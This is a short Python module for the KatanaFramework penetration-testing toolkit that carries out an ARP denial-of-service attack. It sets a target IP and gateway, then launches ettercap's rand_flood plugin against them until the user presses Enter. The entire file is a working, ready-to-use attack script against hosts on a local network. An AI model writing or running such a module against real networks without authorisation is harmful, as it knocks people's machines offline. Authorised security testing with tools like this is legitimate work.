# This module requires katana framework 
# https://github.com/PowerScript/KatanaFramework

# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Katana Core import                  #
from core.KATANAFRAMEWORK import *    #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #

# LIBRARIES  
from core.Function import get_gateway,isConect,Subprocess,checkDevice
import commands              
# END LIBRARIES 

# INFORMATION MODULE
def init():
	init.Author             ="RedToor"
	init.Version            ="1.0"
	init.Description        ="Arp Denegation of Service Attack."
	init.CodeName           ="net/arp.dos"
	init.DateCreation       ="14/06/2016"      
	init.LastModification   ="14/06/2016"
	init.References         =None
	init.License            =KTF_LINCENSE
	init.var                ={}

	# DEFAULT OPTIONS MODULE
	init.options = {
		# NAME      VALUE               RQ     DESCRIPTION
		'interface':[INTERFACE_ETHERNET,True ,'Interface'],
		'target'   :["192.168.1.223"   ,True ,'Target IP'],
		'gateway'  :[get_gateway()     ,True ,'Gateway IP']
	}
	return init
# END INFORMATION MODULE

# CODE MODULE    ############################################################################################
def main(run):

	if isConect() and checkDevice(init.var['interface']):
		printAlert(0,"Starting ARP D.O.S attack...")
		Subprocess("ettercap -Tq -P rand_flood /"+init.var['target']+"// /"+init.var['gateway']+"// -i "+init.var['interface'])
		raw_input(printAlert(8,"to Stop ARP D.O.S Attack (PRESS [ENTER])\n"))
		commands.getoutput("killall ettercap")	

# END CODE MODULE ############################################################################################
